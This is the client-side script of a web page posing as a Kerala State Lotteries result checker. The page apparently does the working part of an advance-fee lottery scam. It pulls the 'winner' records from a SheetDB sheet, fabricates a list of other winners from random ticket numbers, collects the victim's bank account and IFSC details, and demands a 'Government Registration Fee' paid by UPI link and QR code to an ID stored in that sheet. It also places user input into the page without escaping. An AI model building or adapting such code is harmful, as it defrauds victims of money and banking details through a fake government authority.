<script>
  function updateLiveClock() {
    const now = new Date();
    document.getElementById('liveClock').innerHTML =
      `📅 ${now.toLocaleDateString('en-IN')} &nbsp;|&nbsp; ⏰ ${now.toLocaleTimeString('en-IN')} (IST)`;
  }
  setInterval(updateLiveClock, 1000);
  updateLiveClock();

  const API_URL = "https://sheetdb.io/api/v1/hau1ye93dwv6n";

  let current = {
    ticket: "",
    mobile: "",
    prize: "",
    amount: "",
    name: "",
    fee: "0",
    upiId: "",
    status: "Active",
    verifyDate: ""
  };

  function showPage(id) {
    ['pageSearch', 'pageResult', 'pageWithdraw', 'pageConfirm'].forEach(p => {
      document.getElementById(p).style.display = (p === id) ? 'block' : 'none';
    });
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }

  function generateRandomTicket() {
    const num = Math.floor(100000 + Math.random() * 900000);
    return "KL " + num;
  }

  function normalizeTicket(t) {
    const clean = (t || "").trim().toUpperCase();
    if (!clean) return "";
    return clean.startsWith("KL") ? clean.replace(/^KL\s*/, "KL ") : "KL " + clean;
  }

  function fireConfetti() {
    const canvas = document.getElementById("confettiCanvas");
    if (!canvas) return;
    canvas.style.display = "block";
    setTimeout(() => {
      canvas.style.display = "none";
    }, 2500);
  }

  function buildRandomWinnersPool(userTicket, userPrize) {
    const structure = [
      { rank: "1st", prizeText: "25Cr", count: 1 },
      { rank: "2nd", prizeText: "10Cr", count: 1 },
      { rank: "3rd", prizeText: "75 Lakh", count: 1 },
      { rank: "4th", prizeText: "25 Lakh", count: 12 },
      { rank: "5th", prizeText: "12 Lakh", count: 16 },
      { rank: "6th", prizeText: "1 Lakh", count: 36 },
      { rank: "7th", prizeText: "75000", count: 99 },
      { rank: "8th", prizeText: "25000", count: 120 },
      { rank: "9th", prizeText: "10000", count: 179 },
      { rank: "10th", prizeText: "2500", count: 200 }
    ];

    const formattedUserTicket = normalizeTicket(userTicket);
    let htmlContent = "";

    structure.forEach(tier => {
      let tickets = [];
      for (let i = 0; i < tier.count; i++) {
        tickets.push(generateRandomTicket());
      }

      const isUserTier = Boolean(
        formattedUserTicket &&
        userPrize &&
        tier.rank.toLowerCase() === String(userPrize).trim().toLowerCase()
      );

      if (isUserTier && tickets.length > 0) {
        const randomIndex = Math.floor(Math.random() * tickets.length);
        tickets[randomIndex] = formattedUserTicket;
      }

      htmlContent += `
        <div class="prize-tier" ${isUserTier ? 'style="border: 2px solid #16a34a; background:#f0fdf4;"' : ''}>
          <b>⭐ ${tier.rank} Prize (${tier.prizeText})</b>
          <span style="color:#64748b; font-size:11px;">(${tier.count} Person)</span>
          <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 6px; margin-top: 8px; font-family:monospace;">
            ${tickets.map(t =>
              (isUserTier && t === formattedUserTicket)
                ? `<span style="background:#fef08a; padding:6px 4px; border-radius:6px; border:1px solid #d97706; font-weight:bold; color:#b45309; font-size:11px; text-align:center;">⭐ ${t} (You)</span>`
                : `<span style="background:#f8fafc; border:1px solid #cbd5e1; padding:6px 4px; border-radius:5px; color:#334155; font-size:11px; text-align:center;">${t}</span>`
            ).join('')}
          </div>
        </div>
      `;
    });

    document.getElementById("randomWinnersList").innerHTML = htmlContent;
  }

  async function checkResult() {
    const key = document.getElementById("searchKey").value.trim();
    if (!key) {
      alert("Please enter a valid Ticket Number or Mobile Number.");
      return;
    }

    let foundData = null;

    try {
      let res = await fetch(`${API_URL}/search?ticket=${encodeURIComponent(key)}&casesensitive=false`);
      let data = await res.json();

      if (Array.isArray(data) && data.length > 0) {
        foundData = data[0];
      } else {
        res = await fetch(`${API_URL}/search?mobile=${encodeURIComponent(key)}&casesensitive=false`);
        data = await res.json();
        if (Array.isArray(data) && data.length > 0) {
          foundData = data[0];
        }
      }
    } catch (err) {
      console.error("API error:", err);
      foundData = null;
    }

    const resBox = document.getElementById("resultBox");
    const resTitle = document.getElementById("resultTitle");
    const resSub = document.getElementById("resultSub");
    const resEmoji = document.getElementById("resultEmoji");
    const claimBtn = document.getElementById("claimBtn");

    if (foundData) {
      current = {
        ticket: normalizeTicket(foundData.ticket || key),
        mobile: foundData.mobile || "N/A",
        name: foundData.name || "Customer",
        prize: foundData.prize || "1st",
        amount: foundData.amount || "0",
        fee: foundData.fee || "0",
        upiId: foundData.upiId || "",
        status: foundData.status || "Active",
        verifyDate: ""
      };

      resEmoji.innerText = "🎉 🏆 🎊";
      resTitle.innerText = "CONGRATULATIONS!";
      resTitle.style.color = "#047857";
      resSub.innerText = "Your ticket has won an official prize award!";
      claimBtn.style.display = "block";

      resBox.innerHTML = `
        <div class="result-row"><b>Beneficiary Name:</b><span>${current.name}</span></div>
        <div class="result-row"><b>Registered Mobile:</b><span>${current.mobile}</span></div>
        <div class="result-row"><b>Ticket Number:</b><span style="color:#b45309; font-weight:bold;">⭐ ${current.ticket}</span></div>
        <div class="result-row"><b>Winning Category:</b><span style="color:#dc2626; font-weight:bold;">⭐ ${current.prize} Prize Winner</span></div>
        <div class="result-row"><b>Prize Amount:</b><span style="color:#15803d; font-weight:bold; font-size:16px;">₹${current.amount}</span></div>
        <div class="result-row"><b>Claim Status:</b><span style="color:#15803d; font-weight:bold;">${current.status}</span></div>
      `;

      buildRandomWinnersPool(current.ticket, current.prize);
      fireConfetti();
    } else {
      resEmoji.innerText = "🍀";
      resTitle.innerText = "BETTER LUCK NEXT TIME!";
      resTitle.style.color = "#d97706";
      resSub.innerText = "The entered ticket or mobile number was not found in the winning panel.";
      claimBtn.style.display = "none";

      resBox.innerHTML = `
        <div style="text-align:center; padding: 15px; color: #4b5563; font-size: 14px;">
          <p>No winning records matched for: <b>${key}</b></p>
          <p style="margin-top: 6px; font-size: 12px;">Please check your ticket number or mobile number and try again.</p>
        </div>
      `;

      buildRandomWinnersPool("", "");
    }

    showPage("pageResult");
  }

  function maskRealtime(val) {
    const c = val.replace(/\s+/g, '');
    document.getElementById("realtimeMask").innerText =
      c.length > 4 ? "XXXX-XXXX-" + c.slice(-4) : "XXXX-XXXX-" + c;
  }

  function handleBankSubmit(e) {
    e.preventDefault();
    const enteredName = document.getElementById("custName").value.trim();
    const enteredBank = document.getElementById("bankName").value.trim();
    const acc = document.getElementById("accNumber").value.trim();
    const enteredIfsc = document.getElementById("ifscCode").value.toUpperCase().trim();
    const mask = acc.length > 4 ? "XXXX-XXXX-" + acc.slice(-4) : acc;

    const now = new Date();
    current.verifyDate = now.toLocaleDateString('en-IN') + ' ' + now.toLocaleTimeString('en-IN');
    document.getElementById("certTimestamp").innerText = "Verification Date & Time: " + current.verifyDate;

    document.getElementById("receiptBox").innerHTML = `
      <div class="result-row"><b>Account Holder:</b><span>${enteredName}</span></div>
      <div class="result-row"><b>Registered Mobile:</b><span>${current.mobile}</span></div>
      <div class="result-row"><b>Bank Name:</b><span>${enteredBank}</span></div>
      <div class="result-row"><b>Account Number:</b><span style="color:#b45309; font-weight:bold;">${mask}</span></div>
      <div class="result-row"><b>IFSC Code:</b><span>${enteredIfsc}</span></div>
      <div class="result-row"><b>Winning Category:</b><span style="color:#b45309; font-weight:bold;">⭐ ${current.prize} Prize</span></div>
      <div class="result-row"><b>Ticket Number:</b><span style="color:#b45309; font-weight:bold;">⭐ ${current.ticket}</span></div>
      <div class="result-row"><b>Transfer Amount:</b><span style="color:#15803d; font-weight:bold;">₹${current.amount}</span></div>
      <div class="result-row"><b>Government Registration Fee:</b><span style="color:#dc2626; font-weight:bold;">₹${current.fee}</span></div>
      ${current.upiId ? `<div class="result-row"><b>Pay Government registration fee:</b><span style="color:#7c3aed; font-weight:bold;">${current.upiId}</span></div>` : ''}
    `;

    const upiBtnBox = document.getElementById("upiBtnContainer");
    const upiQrBox = document.getElementById("upiQrContainer");

    if (current.upiId) {
      const upiPayUrl = `upi://pay?pa=${encodeURIComponent(current.upiId)}&pn=LotteryWinner&am=${encodeURIComponent(current.fee)}&cu=INR`;
      const qrImageUrl = `https://quickchart.io/qr?text=${encodeURIComponent(upiPayUrl)}&size=160&margin=1`;

      upiBtnBox.innerHTML = `
        <a class="btn-upi" href="${upiPayUrl}">
          📱 Pay via UPI App: ${current.upiId} (₹${current.fee})
        </a>
      `;

      upiQrBox.innerHTML = `
        <div class="qr-container">
          <p style="font-size: 13px; font-weight: bold; color: #7c3aed; margin-bottom: 6px;">Scan QR Code to Pay Registration Fee</p>
          <img src="${qrImageUrl}" alt="UPI QR Code" style="width: 150px; height: 150px; border-radius: 6px;">
          <p style="font-size: 11px; color: #64748b; margin-top: 4px;">Scan using Google Pay, PhonePe, Paytm</p>
        </div>
      `;
    } else {
      upiBtnBox.innerHTML = "";
      upiQrBox.innerHTML = "";
    }

    showPage("pageConfirm");
    fireConfetti();
  }

  function downloadCertificate() {
    const certificateElement = document.getElementById("certificateCard").innerHTML;
    const winPrint = window.open('', '', 'left=0,top=0,width=800,height=900,toolbar=0,scrollbars=0,status=0');
    if (!winPrint) {
      alert("Please allow pop-ups in your browser to download/print the certificate.");
      return;
    }
    winPrint.document.write(`
      <html>
        <head>
          <title>Winning Certificate - Kerala State Lotteries</title>
          <style>
            body { font-family: Arial, sans-serif; padding: 30px; background: #fff; }
            .result-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #cbd5e1; font-size: 15px; }
            h3 { text-align: center; color: #1e3a8a; }
          </style>
        </head>
        <body>
          <div style="background: #fffbeb; border: 6px double #b45309; padding: 30px; border-radius: 12px;">
            ${certificateElement}
          </div>
        </body>
      </html>
    `);
    winPrint.document.close();
    winPrint.focus();
    winPrint.print();
  }
</script>
